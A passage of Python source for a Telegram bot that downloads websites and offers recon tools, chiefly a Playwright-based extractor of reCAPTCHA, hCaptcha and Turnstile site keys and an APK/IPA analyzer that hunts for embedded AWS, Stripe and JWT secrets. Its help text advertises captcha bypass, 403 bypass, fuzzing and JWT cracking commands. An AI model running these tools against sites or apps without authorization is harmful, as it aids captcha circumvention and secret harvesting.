                if body and len(body) > 5:
                    _scan_body(body, req_url, page_url_ref[0])
            except Exception:
                pass

        # ── Intercept responses for captcha API JSON ─
        def _on_response(response):
            resp_url = response.url
            try:
                if any(sig in resp_url for sig in [
                    'recaptcha', 'hcaptcha', 'turnstile', 'funcaptcha'
                ]):
                    body = response.body()
                    if body:
                        text = body.decode('utf-8', errors='ignore')
                        _scan_body(text, resp_url, page_url_ref[0])
            except Exception:
                pass

        # ── Capture console messages ────────────────
        def _on_console(msg):
            try:
                console_log.append(msg.text)
            except Exception:
                pass

        page.on("request",  _on_request)
        page.on("response", _on_response)
        page.on("console",  _on_console)

        if progress_cb: progress_cb("📡 Loading page & intercepting requests...")

        try:
            resp = page.goto(url, wait_until="networkidle", timeout=30_000)
            if resp:
                page_url_ref[0] = page.url
        except PWTimeout:
            # networkidle timeout — still extract what we got
            page_url_ref[0] = page.url
        except Exception as e:
            browser.close()
            return {"error": str(e), "findings": [], "page_url": url}

        # Extra wait for lazy-loaded captcha widgets
        try:
            page.wait_for_timeout(3000)
        except Exception:
            pass

        # ── Scroll to trigger lazy-load ─────────────
        try:
            page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
            page.wait_for_timeout(2000)
        except Exception:
            pass

        if progress_cb: progress_cb("🔍 Scanning final DOM + console logs...")

        # ── Scan final rendered HTML (post-JS) ──────
        try:
            final_html = page.content()
        except Exception:
            final_html = ""

        # ── Extract data-sitekey from DOM via evaluate ──
        try:
            dom_keys = page.evaluate("""() => {
                const results = [];
                // data-sitekey attributes
                document.querySelectorAll('[data-sitekey]').forEach(el => {
                    results.push({key: el.getAttribute('data-sitekey'), tag: el.tagName});
                });
                // grecaptcha object
                try {
                    if (window.grecaptcha && window.grecaptcha.enterprise) {
                        results.push({key: 'grecaptcha.enterprise detected', tag: 'JS'});
                    }
                } catch(e) {}
                return results;
            }""")
            for item in (dom_keys or []):
                key = (item.get("key") or "").strip()
                if key and len(key) >= 10:
                    # Determine type from key format
                    if re.match(r'[0-9a-f]{8}-[0-9a-f]{4}', key, re.I):
                        cap_type = "hCaptcha"
                    elif re.match(r'[01]x[0-9A-Fa-f]', key):
                        cap_type = "Cloudflare Turnstile"
                    else:
                        cap_type = "reCAPTCHA"
                    _add_finding(cap_type, key, f"DOM data-sitekey ({item.get('tag','')})", page_url_ref[0])
        except Exception:
            pass

        browser.close()

    # ── Also scan final HTML with existing extractor ─
    if final_html:
        js_sources_extra = {}
        existing = _extract_captcha_info(final_html, page_url_ref[0], js_sources_extra)
        for f in existing:
            dedup = f["type"] + ":" + f["site_key"]
            if dedup not in seen_keys and f["site_key"]:
                seen_keys.add(dedup)
                f["source"] = "Rendered HTML — " + f["source"]
                findings.append(f)

    # ── Scan console logs for leaked keys ───────────
    console_text = "\n".join(console_log)
    if console_text:
        for pat, cap_type in _CAPTCHA_PATTERNS.items():
            for p in _CAPTCHA_PATTERNS[pat] if isinstance(pat, str) else []:
                for m in p.finditer(console_text):
                    try:
                        key = m.group(1)
                        _add_finding(pat, key, "Console log", page_url_ref[0])
                    except Exception:
                        pass

    return {
        "findings":      findings,
        "page_url":      page_url_ref[0],
        "js_fetched":    len(network_log),   # total intercepted requests
        "network_log":   network_log[:50],   # first 50 for debug
        "error":         None,
    }


def _sitekey_sync(url: str, progress_cb=None) -> dict:
    """
    Try Playwright (DevTools-style) first.
    Falls back to requests-based static scan if Playwright not available.
    """
    # ── Try Playwright ─────────────────────────────
    result = _sitekey_playwright(url, progress_cb)
    if result.get("error") == "playwright_not_installed":
        if progress_cb: progress_cb("⚠️ Playwright မရှိ — static scan သို့ fallback...")
        return _sitekey_static(url, progress_cb)
    return result


def _sitekey_static(url: str, progress_cb=None) -> dict:
    """Fallback: requests-based static HTML + JS scan (no browser)."""
    session = requests.Session()
    session.headers.update(_get_headers())

    if progress_cb: progress_cb("⬇️ Fetching page HTML (static)...")
    try:
        resp = session.get(url, timeout=15, verify=False, allow_redirects=True)
        resp.raise_for_status()
        html     = resp.text
        page_url = resp.url
    except Exception as e:
        return {"error": str(e), "findings": [], "page_url": url}

    final_parsed = urlparse(page_url)
    base_origin  = f"{final_parsed.scheme}://{final_parsed.netloc}"

    def _resolve(src):
        if not src: return None
        src = src.strip()
        if src.startswith('//'): return final_parsed.scheme + ':' + src
        if src.startswith('http'): return src
        if src.startswith('/'): return base_origin + src
        base_path = final_parsed.path.rsplit('/', 1)[0]
        return f"{base_origin}{base_path}/{src}"

    soup = BeautifulSoup(html, 'html.parser')
    js_seen, js_ordered = set(), []

    def _add_js(u):
        if u and u.startswith('http') and u not in js_seen:
            js_seen.add(u); js_ordered.append(u)

    for tag in soup.find_all('script', src=True):
        _add_js(_resolve(tag['src']))

    captcha_sigs_flat = [s for sigs in _CAPTCHA_SCRIPT_SIGS.values() for s in sigs]
    def _prio(u):
        n = u.lower()
        if any(s in n for s in captcha_sigs_flat): return 0
        if any(k in n for k in ('main','app','index','chunk','bundle','vendor','runtime')): return 1
        return 2

    fetch_list = sorted(js_ordered, key=_prio)[:15]

    if progress_cb: progress_cb(f"📦 Fetching {len(fetch_list)} JS files...")
    js_sources = {}
    for js_url in fetch_list:
        try:
            r = session.get(js_url, timeout=10, verify=False)
            if r.status_code == 200 and len(r.text) > 50:
                js_sources[js_url] = r.text[:800_000]
        except Exception:
            pass

    if progress_cb: progress_cb(f"🔍 Scanning {len(js_sources)} JS files...")
    findings = _extract_captcha_info(html, page_url, js_sources)
    return {"findings": findings, "page_url": page_url, "js_fetched": len(js_sources), "error": None}


async def cmd_sitekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/sitekey <url> — Extract reCAPTCHA/hCaptcha/Turnstile site_key, page_url, action"""
    if not await check_force_join(update, context):
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/sitekey https://example.com`\n\n"
            "🔑 *Extracts:*\n"
            "  • `site_key` — Captcha public key\n"
            "  • `page_url` — Final URL (after redirects)\n"
            "  • `action`   — reCAPTCHA v3 action name\n\n"
            "🛡️ *Supported Captcha Types:*\n"
            "  • reCAPTCHA v2 _(data-sitekey / grecaptcha.render)_\n"
            "  • reCAPTCHA v3 _(grecaptcha.execute + action)_\n"
            "  • reCAPTCHA Enterprise\n"
            "  • hCaptcha _(UUID format key)_\n"
            "  • Cloudflare Turnstile _(0x4A... / 1x00...)_\n"
            "  • FunCaptcha / Arkose Labs\n"
            "  • GeeTest\n"
            "  • AWS WAF Captcha\n\n"
            "📦 HTML source + JS bundles ကို scan မည်\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🔑 *Site Key Extractor*\n🌐 `{domain}`\n\n"
        "🌐 Launching headless browser...\n"
        "📡 Intercepting network requests...\n"
        "🔍 Scanning DOM + console logs...\n⏳",
        parse_mode='Markdown'
    )

    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🔑 *Scanning `{domain}`*\n\n{txt}",
                        parse_mode='Markdown')
                except BadRequest:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(
            _sitekey_sync, url, lambda t: progress_q.append(t)
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    if result.get("error"):
        await msg.edit_text(
            f"❌ *Fetch error*\n`{result['error']}`",
            parse_mode='Markdown'
        )
        return

    findings  = result["findings"]
    page_url  = result["page_url"]
    js_count  = result["js_fetched"]

    # ─── No captcha found ───────────────────────
    if not findings:
        await msg.edit_text(
            f"🔑 *Site Key Extractor — `{domain}`*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📭 *Captcha မတွေ့ပါ*\n\n"
            f"🌐 Page URL: `{page_url}`\n"
            f"📡 Requests intercepted: `{js_count}`\n\n"
            "_Network requests, DOM, console logs အကုန် scan ပြီးပါပြီ_\n"
            "_Site မှာ Captcha မပါ သို့မဟုတ် render ပြီးမှ load ဖြစ်နိုင်သည်_",
            parse_mode='Markdown'
        )
        return

    # ─── Build report ────────────────────────────
    lines = [
        f"🔑 *Site Key Extractor — `{domain}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"🌐 Page URL: `{page_url}`",
        f"📡 Requests intercepted: `{js_count}`",
        f"✅ Found: `{len(findings)}` captcha instance(s)",
        "",
    ]

    # Type icons
    _TYPE_ICON = {
        "reCAPTCHA v2":          "🔵",
        "reCAPTCHA v3":          "🟣",
        "reCAPTCHA Enterprise":  "🟤",
        "hCaptcha":              "🟡",
        "Cloudflare Turnstile":  "🟠",
        "FunCaptcha":            "🔴",
        "GeeTest":               "🟢",
        "AWS WAF Captcha":       "⚪",
    }

    for i, f in enumerate(findings, 1):
        icon = next((v for k, v in _TYPE_ICON.items() if k in f["type"]), "🔑")
        lines.append(f"*{icon} [{i}] {f['type']}*")
        lines.append(f"  🔑 `site_key` : `{f['site_key'] or 'N/A'}`")
        lines.append(f"  🌐 `page_url`  : `{f['page_url']}`")
        if f["action"]:
            lines.append(f"  ⚡ `action`    : `{f['action']}`")
        lines.append(f"  📂 Source     : _{f['source'][:70]}_")
        lines.append("")

    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append("⚠️ _Authorized testing only_")

    report = "\n".join(lines)

    try:
        if len(report) <= 4000:
            await msg.edit_text(report, parse_mode='Markdown')
        else:
            await msg.edit_text(report[:4000], parse_mode='Markdown')
            await update.effective_message.reply_text(report[4000:8000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')

    # ─── Export JSON ─────────────────────────────
    import io as _io
    ts        = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d    = re.sub(r'[^\w\-]', '_', domain)
    export    = {
        "domain":      domain,
        "page_url":    page_url,
        "scanned_at":  datetime.now().isoformat(),
        "js_scanned":  js_count,
        "findings": [
            {
                "type":     f["type"],
                "site_key": f["site_key"],
                "page_url": f["page_url"],
                "action":   f["action"],
                "source":   f["source"],
            }
            for f in findings
        ],
    }
    json_buf = _io.BytesIO(json.dumps(export, indent=2, ensure_ascii=False).encode())
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=json_buf,
            filename=f"sitekey_{safe_d}_{ts}.json",
            caption=(
                f"🔑 *Site Key Report — `{domain}`*\n"
                f"Found: `{len(findings)}` | JS: `{js_count}`"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.warning("Sitekey export error: %s", e)


# ══════════════════════════════════════════════════
# 🤖  BOT — USER COMMANDS
# ══════════════════════════════════════════════════


async def cmd_mystats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/mystats — Detailed personal statistics"""
    uid = update.effective_user.id
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, uid, update.effective_user.first_name)
        reset_daily(u)
        _save_db_sync(db)

    lim      = get_limit(db, u)
    dls      = u.get("downloads", [])
    total_mb = sum(d.get("size_mb", 0) for d in dls)
    success  = sum(1 for d in dls if d.get("status") == "success")
    failed   = len(dls) - success

    bar = pbar(u["count_today"], lim if lim > 0 else max(u["count_today"], 1))

    await update.effective_message.reply_text(
        "📊 *My Statistics*\n\n"
        "👤 *%s*\n"
        "🆔 `%d`\n\n"
        "📅 *Today:*\n"
        "`%s`\n"
        "Used: `%d` / `%s`\n\n"
        "📦 *All Time:*\n"
        "Downloads: `%d` total\n"
        "✅ Success: `%d`  ❌ Failed: `%d`\n"
        "💾 Data: `%.1f MB`" % (
            u["name"], uid,
            bar, u["count_today"], "∞" if lim == 0 else str(lim),
            u["total_downloads"], success, failed, total_mb,
        ),
        parse_mode="Markdown"
    )





async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    User က APK/IPA/ZIP/JAR upload လုပ်ရင် auto-detect ပြီး analyze လုပ်
    """
    doc = update.message.document
    if not doc:
        return

    uid   = update.effective_user.id
    uname = update.effective_user.first_name or "User"

    # ── Force join check ─────────────────────────
    if not await check_force_join(update, context):
        return

    # ── File type check ──────────────────────────
    fname    = doc.file_name or ""
    ext      = os.path.splitext(fname.lower())[1]
    fsize_mb = doc.file_size / 1024 / 1024 if doc.file_size else 0

    if ext not in _APP_EXTS:
        # Not an app file — ignore silently
        return

    # ── Size limit ───────────────────────────────
    if fsize_mb > APP_MAX_MB:
        await update.message.reply_text(
            f"⚠️ File ကြီးလွန်းတယ် (`{fsize_mb:.1f}MB`)\n"
            f"📏 Max: `{APP_MAX_MB}MB`",
            parse_mode='Markdown'
        )
        return

    # ── Rate limit ───────────────────────────────
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.message.reply_text(f"⏱️ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    file_type = _APP_EXTS.get(ext, ext.upper())
    msg = await update.message.reply_text(
        f"📱 *{file_type} Detected!*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 `{fname}`\n"
        f"💾 `{fsize_mb:.1f} MB`\n\n"
        f"⬇️ Downloading from Telegram...",
        parse_mode='Markdown'
    )

    # ── Download file from Telegram ──────────────
    work_dir  = os.path.join(APP_ANALYZE_DIR, str(uid))
    os.makedirs(work_dir, exist_ok=True)
    safe_name = re.sub(r'[^\w\.\-]', '_', fname)
    save_path = os.path.join(work_dir, safe_name)

    try:
        tg_file = await context.bot.get_file(doc.file_id)
        await tg_file.download_to_drive(save_path)
    except Exception as e:
        await msg.edit_text(f"❌ Download error: `{type(e).__name__}`", parse_mode='Markdown')
        return

    # ── Save path for /appassets command ─────────
    async with db_lock:
        db2 = _load_db_sync()
        u2  = get_user(db2, uid, uname)
        u2["last_uploaded_app"] = save_path
        _save_db_sync(db2)

    await msg.edit_text(
        f"📱 *{file_type} — `{fname}`*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Downloaded `{fsize_mb:.1f}MB`\n\n"
        f"🔍 Phase 1: Text/Source scanning...\n"
        f"📦 Phase 2: Binary string extraction...\n"
        f"🔑 Phase 3: Secret/key detection...\n\n"
        f"⏳ Analyzing...",
        parse_mode='Markdown'
    )

    # ── Progress tracking ─────────────────────────
    prog_q = []
    async def _prog_loop():
        while True:
            await asyncio.sleep(3)
            if prog_q:
                txt = prog_q[-1]; prog_q.clear()
                try:
                    await msg.edit_text(
                        f"📱 *Analyzing `{fname}`*\n\n{txt}",
                        parse_mode='Markdown'
                    )
                except Exception:
                    pass

    prog_task = asyncio.create_task(_prog_loop())

    try:
        result = await asyncio.to_thread(
            analyze_app_file, save_path, lambda t: prog_q.append(t)
        )
    except Exception as e:
        prog_task.cancel()
        await msg.edit_text(f"❌ Analysis error: `{type(e).__name__}`\n`{str(e)[:100]}`",
                            parse_mode='Markdown')
        try: os.remove(save_path)
        except: pass
        return
    finally:
        prog_task.cancel()

    # ── Keep file for /appassets — remove previous file if any ──
    async with db_lock:
        db_pre = _load_db_sync()
        u_pre  = get_user(db_pre, uid, uname)
        old_path = u_pre.get("last_uploaded_app")
        if old_path and old_path != save_path:
            try: os.remove(old_path)
            except: pass

    # ══ Build result report ═══════════════════════
    app_info = result.get("app_info", {})
    urls     = result.get("urls", [])
    api_paths= result.get("api_paths", [])
    ws_urls  = result.get("ws_urls", [])
    secrets  = result.get("secrets", {})
    src_files= result.get("source_files", [])
    stats    = result.get("stats", {})
    errors   = result.get("errors", [])

    # ── Platform badge ────────────────────────────
    platform = app_info.get("platform", "")
    plat_icon = "🤖" if platform == "Android" else ("🍎" if platform == "iOS" else "📦")

    lines = [
        f"📱 *App Analysis — `{fname}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"{plat_icon} `{result['file_type']}` | 💾 `{result['file_size_mb']}MB`",
        f"📂 Files: `{stats.get('total_files',0)}` | Scanned: `{stats.get('text_files_scanned',0)}`",
        f"🌐 URLs: `{stats.get('unique_urls',0)}` | 🛤 API Paths: `{stats.get('api_paths',0)}`",
        f"🔌 WebSocket: `{stats.get('ws_urls',0)}` | 🔑 Secret types: `{stats.get('secret_types',0)}`",
        "",
    ]

    # App Info
    if app_info:
        lines.append(f"*{'🤖 Android' if platform == 'Android' else '🍎 iOS'} App Info:*")
        pkg = app_info.get("package") or app_info.get("bundle_id", "")
        if pkg:
            lines.append(f"  📦 `{pkg}`")
        perms = app_info.get("permissions", [])[:8]
        if perms:
            lines.append(f"  🔐 Permissions: `{', '.join(perms[:5])}`{'...' if len(perms)>5 else ''}")
        url_schemes = app_info.get("url_schemes", [])
        if url_schemes:
            lines.append(f"  🔗 URL Schemes: `{'`, `'.join(url_schemes[:4])}`")
        # Meta-data with potential API keys
        meta = app_info.get("meta_data", {})
        interesting_meta = {k: v for k, v in meta.items()
                           if any(kw in k.lower() for kw in
                                  ['api', 'key', 'secret', 'token', 'firebase',
                                   'google', 'facebook', 'stripe', 'url', 'host'])}
        if interesting_meta:
            lines.append(f"  🗝 Meta-data keys ({len(interesting_meta)}):")
            for k, v in list(interesting_meta.items())[:5]:
                lines.append(f"     • `{k}` = `{v[:40]}`")
        # iOS plist keys
        plist_keys = app_info.get("keys", {})
        if plist_keys:
            lines.append(f"  🗝 Config keys ({len(plist_keys)}):")
            for k, v in list(plist_keys.items())[:5]:
                lines.append(f"     • `{k}` = `{v[:40]}`")
        lines.append("")

    # Secrets found
    if secrets:
        lines.append(f"*🔑 Potential Secrets Found ({len(secrets)} types):*")
        for name, count in sorted(secrets.items(), key=lambda x: -x[1]):
            risk = "🔴" if name in ('AWS Key', 'AWS Secret', 'Private Key', 'Stripe Key',
                                     'Hardcoded Pass', 'JWT Token') else "🟡"
            lines.append(f"  {risk} `{name}` × {count}")
        lines.append("")

    # API paths
    if api_paths:
        lines.append(f"*🛤 API Paths ({len(api_paths)}):*")
        for p in api_paths[:15]:
            lines.append(f"  🟢 `{p}`")
        if len(api_paths) > 15:
            lines.append(f"  _...and {len(api_paths)-15} more in JSON report_")
        lines.append("")

    # Full URLs (top domains)
    if urls:
        # Group by domain
        domain_map = {}
        for u in urls:
            try:
                d = urlparse(u).netloc
                domain_map.setdefault(d, []).append(u)
            except Exception:
                pass
        lines.append(f"*🌐 Hosts Found ({len(domain_map)} unique):*")
        for domain, durls in sorted(domain_map.items(), key=lambda x: -len(x[1]))[:10]:
            lines.append(f"  🔵 `{domain}` ({len(durls)} URLs)")
        lines.append("")

    # WebSocket
    if ws_urls:
        lines.append(f"*🔌 WebSocket URLs ({len(ws_urls)}):*")
        for w in ws_urls[:5]:
            lines.append(f"  🟣 `{w[:80]}`")
        lines.append("")

    # Top source files
    if src_files:
        lines.append(f"*📄 Hot Source Files ({len(src_files)}):*")
        for sf in src_files[:8]:
            fname_short = sf["file"].split("/")[-1]
            tags = []
            if sf["urls"] > 0:   tags.append(f"{sf['urls']} URLs")
            if sf["secrets"]:    tags.append(f"🔑 {','.join(sf['secrets'][:2])}")
            lines.append(f"  📝 `{fname_short}` — {' | '.join(tags)}")
        lines.append("")

    if errors:
        lines.append(f"⚠️ _Errors: {len(errors)}_")

    lines.append("⚠️ _Passive analysis only — no exploitation_")

    report_text = "\n".join(lines)

    # ── Send text report ──────────────────────────
    try:
        if len(report_text) <= 4000:
            await msg.edit_text(report_text, parse_mode='Markdown')
        else:
            await msg.edit_text(report_text[:4000], parse_mode='Markdown')
            await update.message.reply_text(report_text[4000:8000], parse_mode='Markdown')
    except Exception:
        await update.message.reply_text(report_text[:4000], parse_mode='Markdown')

    # ── Export full JSON report ───────────────────
    try:
        safe_fname = re.sub(r'[^\w\-]', '_', os.path.splitext(fname)[0])
        ts         = datetime.now().strftime("%Y%m%d_%H%M%S")
        json_path  = os.path.join(APP_ANALYZE_DIR, f"app_{safe_fname}_{ts}.json")

        export = {
            "filename":    fname,
            "file_type":   result["file_type"],
            "file_size_mb":result["file_size_mb"],
            "analyzed_at": datetime.now().isoformat(),
            "app_info":    app_info,
            "stats":       stats,
            "api_paths":   api_paths,
            "urls":        urls,
            "ws_urls":     ws_urls,
            "secrets_found": {k: f"×{v}" for k, v in secrets.items()},
            "source_files":  src_files,
            "errors":        errors[:20],
        }
        with open(json_path, 'w', encoding='utf-8') as jf:
            json.dump(export, jf, ensure_ascii=False, indent=2)

        cap = (
            f"📦 *App Analysis Report*\n"
            f"📱 `{fname}`\n"
            f"🌐 `{stats.get('unique_urls',0)}` URLs | "
            f"🛤 `{stats.get('api_paths',0)}` API paths | "
            f"🔑 `{stats.get('secret_types',0)}` secret types"
        )
        with open(json_path, 'rb') as jf:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=jf,
                filename=f"app_{safe_fname}_{ts}.json",
                caption=cap,
                parse_mode='Markdown'
            )
        os.remove(json_path)

    except Exception as e:
        logger.warning("App JSON export error: %s", e)



async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    uname = update.effective_user.first_name or "User"
    async with db_lock:
        db2 = _load_db_sync()
        get_user(db2, uid, uname)
        _save_db_sync(db2)

    js_status   = "✅ JS Ready" if PUPPETEER_OK else "⚠️ JS Off"
    adm_line     = "\n\n🔧 *Admin Panel:* /admin" if uid in ADMIN_IDS else ""

    await update.effective_message.reply_text(
        f"👋 *မင်္ဂလာပါ, {uname}!*\n"
        f"🌐 *Website Downloader Bot v17.0*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📥 *Download Commands:*\n"
        f"  `/download <url>` — Single page\n"
        f"  `/fullsite <url>` — Full website\n"
        f"  `/jsdownload <url>` — JS/React site _{js_status}_\n"
        f"  `/resume <url>` — Download ဆက်လုပ်ရန်\n"
        f"  `/stop` — Download ရပ်ရန်\n\n"
        f"🔍 *Tools:*\n"
        f"  `/vuln <url>` — Security scan\n"
        f"  `/api <url>` — API discovery\n"
        f"  `/tech <url>` — Tech stack fingerprint\n"
        f"  `/extract <url>` — Secret/key scanner\n"
        f"  `/subdomains <domain>` — Subdomain enumeration\n"
        f"  `/bypass403 <url>` — 403 bypass tester\n"
        f"  `/fuzz <url>` — Path & param fuzzer\n"
        f"  `/monitor` — Change alert monitor\n"
        f"  `/smartfuzz <url>` — 🗂️ Context-aware smart fuzzer\n"
        f"  `/antibot <url>` — 🤖 Anti-bot / Captcha bypass\n"
        f"  `/jwtattack <token>` — 🎟️ JWT decode & crack\n"
        f"  `/sitekey <url>` — 🔑 reCAPTCHA/hCaptcha/Turnstile key extractor\n\n"
        f"📱 *App Analyzer:*\n"
        f"  APK / IPA / ZIP / JAR upload လုပ်ပါ\n"
        f"  → Auto API + Secret extraction\n\n"
        f"📊 *Account:*\n"
        f"  `/status` — Usage ကြည့်ရန်\n"
        f"  `/history` — Download history\n"
        f"  `/mystats` — Detailed stats\n\n"
        f"🔒 SSRF Protected{adm_line}\n\n"
        f"❓ /help — Commands အကူအညီ",
        parse_mode='Markdown'
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid     = update.effective_user.id
    is_adm  = uid in ADMIN_IDS
    js_st    = "✅ Ready" if PUPPETEER_OK else "❌ `npm install puppeteer`"
    base = (
        "📖 *Commands Guide — v17.0*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"

        "📥 *Website Download*\n"
        "  `/download <url>`\n"
        "   └ Single page HTML + assets\n\n"
        "  `/fullsite <url>`\n"
        "   └ Website အပြည့် (sitemap scan ပါ)\n\n"
        "  `/jsdownload <url>`\n"
        "   └ React/Vue/Angular JS sites\n"
        "   └ Status: " + js_st + "\n\n"
        "  `/jsfullsite <url>`\n"
        "   └ JS + Full crawl ပေါင်းစပ်\n\n"
        "  `/resume <url>`\n"
        "   └ ကျသွားလျှင် ဆက်လုပ်ရန်\n\n"

        "📱 *App Analyzer (Upload File):*\n"
        "  APK / IPA / ZIP / JAR / AAB / JAR\n"
        "   └ Chat ထဲ file drop ရုံသာ\n"
        "   └ API endpoints + Secrets + Hosts\n"
        "   └ AndroidManifest / Info.plist parse\n"
        "   └ JSON report auto-export\n"
        f"   └ Max size: `{APP_MAX_MB}MB`\n\n"
        "🔍 *Scan & Discovery*\n"
        "  `/vuln <url>` — Security vulnerability scan\n"
        "  `/api <url>` — API endpoint discovery\n"
        "  `/tech <url>` — Tech stack fingerprinter\n"
        "  `/extract <url>` — Secret/API key scanner (JS bundles)\n\n"
        "🔓 *Advanced Recon*\n"
        "  `/subdomains <domain>` — Subdomain enum (crt.sh + brute-force)\n"
        "  `/bypass403 <url>` — 403 bypass (50+ techniques)\n"
        "  `/fuzz <url> [paths|params]` — HTTP path & param fuzzer\n\n"
        "🔔 *Monitoring*\n"
        "  `/monitor add <url> [min] [label]` — Alert on page change\n"
        "  `/monitor list|del|clear` — Manage monitors\n\n"

        "📊 *My Account*\n"
        "  `/status` — Daily limit + usage\n"
        "  `/history` — Download log (last 10)\n"
        "  `/mystats` — Total stats\n\n"

        "💡 *Tips:*\n"
        "  • 50MB+ ဆိုရင် auto split လုပ်ပြီး ပို့ပေးမယ်\n"
        "  • JS site error ဖြစ်ရင် `/jsdownload` သုံးပါ\n"
        "  • Download ကျရင် `/resume` နဲ့ ဆက်နိုင်တယ်\n"
        "  • 🔒 SSRF + Path traversal protected"
    )

    admin_section = (
        "\n\n👑 *Admin Commands:*\n"
        "  `/admin` — Admin panel\n"
        "  `/ban` `/unban` `/setlimit` `/userinfo`\n"
        "  `/broadcast` `/allusers` `/setpages` `/setassets`\n\n"
            )

    await update.effective_message.reply_text(
        base + (admin_section if is_adm else ""),
        parse_mode='Markdown'
    )

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, update.effective_user.id, update.effective_user.first_name)
        reset_daily(u)
        _save_db_sync(db)
    lim  = get_limit(db, u)
    used = u["count_today"]
    bar  = pbar(used, lim if lim > 0 else max(used, 1))
    await update.effective_message.reply_text(
        f"📊 *Status*\n\n👤 {u['name']}\n"
        f"🚫 Banned: {'Yes ❌' if u['banned'] else 'No ✅'}\n\n"
        f"📅 Today:\n`{bar}`\n"
        f"Used: `{used}` / `{'∞' if lim==0 else lim}`\n"
        f"📦 Total: `{u['total_downloads']}`",
        parse_mode='Markdown'
    )

async def cmd_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, update.effective_user.id)
    dls = u.get("downloads",[])[-10:]
    if not dls:
        await update.effective_message.reply_text("📭 History မရှိသေးပါ"); return
    lines = ["📜 *Download History*\n"]
    for d in reversed(dls):
        icon = {"success":"✅","too_large":"⚠️"}.get(d["status"],"❌")
        lines.append(f"{icon} `{d['url'][:45]}`\n   {d['time']} | {d['size_mb']}MB")
    await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')


# ── Core download runner ──────────────────────────

async def _run_download(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    url: str, full_site: bool, use_js: bool,
    resume_mode: bool = False
):
    uid   = update.effective_user.id
    uname = update.effective_user.first_name

    # ── Rate limit check ──────────────────────────
    if not resume_mode:
        allowed, wait_sec = check_rate_limit(uid)
        if not allowed:
            await update.effective_message.reply_text(
                f"⏱️ နည်းနည်းစောင့်ပါ — `{wait_sec}` seconds ကျန်သေးတယ်",
                parse_mode='Markdown'
            )
            return

    # ── SSRF pre-check ────────────────────────────
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(
            f"🚫 URL ကို download လုပ်ခွင့်မပြုပါ\n`{reason}`",
            parse_mode='Markdown'
        )
        return

    # ── DB checks (with lock) ─────────────────────
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, uid, uname)
        reset_daily(u)

        if u["banned"]:
            _save_db_sync(db)
            await update.effective_message.reply_text("🚫 Ban ထားပါတယ်"); return
        if not db["settings"]["bot_enabled"] and uid not in ADMIN_IDS:
            _save_db_sync(db)
            await update.effective_message.reply_text("🔴 Bot ယာယီပိတ်ထားပါတယ်"); return
        if not resume_mode and not can_download(db, u):
            lim = get_limit(db, u)
            _save_db_sync(db)
            await update.effective_message.reply_text(f"⛔ Daily limit ({lim}) ပြည့်ပါပြီ"); return
        _save_db_sync(db)

    mode_txt = ("🌐 Full" if full_site else "📄 Single") + (" ⚡JS" if use_js else "")
    msg = await update.effective_message.reply_text(
        f"⏳ *Download စနေပါတယ်{'(Resume)' if resume_mode else ''}...*\n"
        f"🔗 `{sanitize_log_url(url)}`\n📋 {mode_txt}\n\n"
        f"`{'░'*18}`  0%",
        parse_mode='Markdown'
    )

    last = {'t': ''}
    def sync_cb(text): last['t'] = text

    # ── Cancel flag — /stop command ───────────────
    cancel_event = asyncio.Event()
    _cancel_flags[uid] = cancel_event

    async def progress_loop():
        while True:
            await asyncio.sleep(2.5)
            if cancel_event.is_set():
                return
            if last['t']:
                try:
                    await msg.edit_text(
                        f"⏳ *Download နေဆဲ...*\n🔗 `{sanitize_log_url(url)}`\n\n{last['t']}",
                        parse_mode='Markdown'
                    )
                except RetryAfter as e:
                    await asyncio.sleep(e.retry_after + 1)
                except BadRequest:
                    pass

    prog = asyncio.create_task(progress_loop())

    async with download_semaphore:
        # Check cancel before starting heavy work
        if cancel_event.is_set():
            prog.cancel()
            _cancel_flags.pop(uid, None)
